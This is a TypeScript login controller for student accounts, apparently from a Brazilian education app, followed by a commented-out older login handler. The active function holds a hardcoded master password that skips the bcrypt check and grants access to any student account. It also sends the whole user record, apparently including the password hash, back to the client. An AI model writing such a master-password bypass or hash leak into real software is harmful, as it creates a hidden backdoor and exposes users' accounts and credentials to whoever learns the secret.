import { Brand, User } from "../models";
import ErrorResponse from "../utils/errorResponse";
import bcryptjs from 'bcryptjs';

const MASTER_PASS = "<lRlcLUIr>s+ki8]"

export const login = async ( req: any, res: any, next: any ) => {
    const { email, password } = req.body;
    if( !email ) return next(new ErrorResponse('Por favor, insira um mail.', 400));
    if( !password ) return next(new ErrorResponse('Por favor, insira uma senha.', 400));
    const user = await User.findOne({ 
        where: {
            email,
            type: 'Student'
        },
        include: [{ model: Brand, required: true }]
    });
    if( password !== MASTER_PASS && user ){
        const result = await bcryptjs.compare(password, user.getDataValue('encrypted_password'));
        if( !result ) return next(new ErrorResponse('Credenciais Inválidas', 401));
    }
    if( !user ) return next(new ErrorResponse('Credenciais Inválidas', 401));
    if( (user as any).type !== 'Student' ) return next(new ErrorResponse('Este usuário não é um estudante', 401));
    
    const foundUser = user.get({ plain: true });
    const altColors = (JSON.parse(`{"alt_${foundUser.brand.colors.substring( foundUser.brand.colors.indexOf('primary'), foundUser.brand.colors.indexOf('social') + 24 ).trim().replace(/\n/g, ', ').replace(/,\s{1,}/g, ',"alt_').replace(/:\s{1,}/g, '":')}}`))
    
    foundUser.brand = {
        ...foundUser.brand,
        ...altColors
    }
    res.status(200).json({
        success: true,
        data: foundUser
        // data: {
        //     ...user,
        //     brand: {
        //         ...user.brand,
        //         ...
        //     }
        // }
    })
}

/*
exports.login = asyncHandler( async ( req, res, next ) => {
    const { password, telephone, expoPushToken, role, email } = req.body;

    if( !password ) return next(new ErrorResponse('Por favor, insira uma senha.', 400));
    let payload = {};
    if( role === 'ADMIN' ){
        payload = { email }
    }else{
        if( !telephone ) return next(new ErrorResponse('Por favor, insira seu telefono.', 400));
        if( telephone && !/^(\(\d{2}\)\s{1}\d{5}\s{1}\d{4})$/g.test(telephone) ) return next(new ErrorResponse('O campo Telefone não é válido.', 400));
        if( password.length < 8 ) return next(new ErrorResponse('O campo senha não é válido.', 400));
        payload = { telephone };
    }

    let user = await User.findOne(payload).select('+password');
    if( !user ) return next(new ErrorResponse('Credenciais inválidas', 401));

    const isMatch = await user.matchPassword(password);
    if( !isMatch ) return next(new ErrorResponse('Credenciais inválidas', 401));

    if( !user.active ){
        logTrigger(`Usuário <${user._id}> inativo tentou entrar`, 'Auth', 'LOGIN', user.email, req.ip?.replace( /[^0-9.]/g, '' ) || req.connection?.remoteAddress?.replace( /[^0-9.]/g, '' ));
        return next(new ErrorResponse('Seu usuário não esta ativo. Peça a um Administrador de Sistema ativar você', 500));
    }

    if( user.role === 'USER' ){
        if( expoPushToken && user.expoPushToken !== expoPushToken ){
            user = await User.findByIdAndUpdate(user._id, { expoPushToken } , updateOptions);
        }
    }

    if( role === 'ADMIN' && user.role !== 'ADMIN'  ){
        return next(new ErrorResponse('Você esta solicitando acesso a uma área restrita.', 401));
    }

    logTrigger(`Usuário <${user._id}> logado com sucesso`, 'Auth', 'LOGIN', user.email, req.ip || req.connection?.remoteAddress?.replace( /[^0-9.]/g, '' ));
    sendTokenResponse(user, 200, res)
    // await sendPushNotification(user.expoPushToken, `Bem-vindo(a), ${user.name} ${user.lastName}\n Você logou com sucesso`);
})

*/